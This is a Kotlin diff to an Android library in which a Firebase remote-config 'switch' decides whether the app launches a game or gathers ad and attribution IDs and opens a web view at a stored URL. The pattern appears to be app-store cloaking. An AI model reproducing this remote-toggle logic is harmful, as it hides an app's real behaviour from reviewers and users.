@@ -16,6 +16,9 @@ import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.facebook.applinks.AppLinkData
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
+import com.google.firebase.ktx.Firebase
+import com.google.firebase.remoteconfig.ktx.remoteConfig
+import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
 import com.onesignal.OneSignal
 import com.trident.library.Utils.createRepoInstance
 import com.trident.library.callbacks.BackObjectCallback
@@ -106,62 +109,22 @@ object BackObject {
 
         backObjectCallback = activity as BackObjectCallback
 
-        if (preferences.getOnGameLaunched(name = ON_GAME_LAUNCHED) == TRUE) {
-            Log.d("library", " game launched (non-first launch)")
-            backObjectCallback.startGame()
-            activity.finish()
+        when(preferences.getOnRemoteStatus()){
 
-        } else if (preferences.getOnWebLaunched(name = ON_WEB_LAUNCHED) == TRUE) {
+            "true" -> {
 
-            activity.lifecycleScope.launch(Dispatchers.IO) {
-                //  Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")
-                Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")
+                fetchMainCycle(activity, appsflyerId, oneSignalId)
 
-                //starting web activity
-                activity.startActivity(
-                    Intent(activity, WebActivity::class.java)
-                        .putExtra(
-                            "url",
-                            createRepoInstance(activity).linkDao.getAllData().component1().link
-                        )
-                )
-
-                activity.finish()
             }
 
+            "false" -> {
 
-        } else {
+                backObjectCallback.startGame()
 
-            //printing hash key
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                printHashKey(activity.applicationContext)
             }
 
-            //assigning vars from app context strings
-            assignVars(activity)
+            "null" -> getFireBaseRemoteData(activity, appsflyerId, oneSignalId)
 
-            //initializing one signal
-            initOnesignal(activity.applicationContext, oneSignalId)
-
-            //assigning ad_id
-            assignAdvertiserId(activity.applicationContext)
-
-            //setting local data params
-            setLocalData(activity)
-
-            //observing live datas
-            observeLiveData(activity)
-
-            //apps data in coroutine
-            activity.lifecycleScope.launch(Dispatchers.IO) {
-                getAppsData(appsflyerId, activity)
-            }
-
-
-            //facebook deep link in coroutine
-            activity.lifecycleScope.launch(Dispatchers.IO) {
-                fetchDeepLink(activity)
-            }
 
         }
 
@@ -523,5 +486,113 @@ object BackObject {
         }
     }
 
+
+    private fun getFireBaseRemoteData(activity: AppCompatActivity, appsflyerId: String, oneSignalId: String){
+        val configSettings = remoteConfigSettings {
+            minimumFetchIntervalInSeconds = 3000
+        }
+
+        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)
+
+        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->
+
+
+            if (task.isSuccessful) {
+
+                when (Firebase.remoteConfig.getBoolean("switch")) {
+
+                    false -> {
+
+                        preferences.setOnRemoteStatus("false")
+
+                        backObjectCallback.startGame()
+
+                    }
+
+                    true -> {
+
+                        preferences.setOnRemoteStatus("true")
+
+                        fetchMainCycle(activity, appsflyerId, oneSignalId)
+
+                    }
+
+                }
+            } else {
+
+                preferences.setOnRemoteStatus("false")
+                backObjectCallback.startGame()
+
+            }
+
+        }
+    }
+
+    private fun startWeb(activity: AppCompatActivity){
+        activity.lifecycleScope.launch(Dispatchers.IO) {
+            //  Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")
+            Log.d("library", createRepoInstance(activity).linkDao.getAllData().component1().link.toString() + " link not first launch web")
+
+            //starting web activity
+            activity.startActivity(
+                Intent(activity, WebActivity::class.java)
+                    .putExtra(
+                        "url",
+                        createRepoInstance(activity).linkDao.getAllData().component1().link
+                    )
+            )
+
+            activity.finish()
+        }
+    }
+
+
+    private fun fetchMainCycle(activity: AppCompatActivity, appsflyerId: String, oneSignalId: String){
+
+        if (preferences.getOnGameLaunched(name = ON_GAME_LAUNCHED) == TRUE) {
+            Log.d("library", " game launched (non-first launch)")
+            backObjectCallback.startGame()
+            activity.finish()
+
+        } else if (preferences.getOnWebLaunched(name = ON_WEB_LAUNCHED) == TRUE) {
+
+            startWeb(activity)
+
+        } else {
+
+            //printing hash key
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                printHashKey(activity.applicationContext)
+            }
+
+            //assigning vars from app context strings
+            assignVars(activity)
+
+            //initializing one signal
+            initOnesignal(activity.applicationContext, oneSignalId)
+
+            //assigning ad_id
+            assignAdvertiserId(activity.applicationContext)
+
+            //setting local data params
+            setLocalData(activity)
+
+            //observing live datas
+            observeLiveData(activity)
+
+            //apps data in coroutine
+            activity.lifecycleScope.launch(Dispatchers.IO) {
+                getAppsData(appsflyerId, activity)
+            }
+
+
+            //facebook deep link in coroutine
+            activity.lifecycleScope.launch(Dispatchers.IO) {
+                fetchDeepLink(activity)
+            }
+
+        }
+
+    }
 
 }
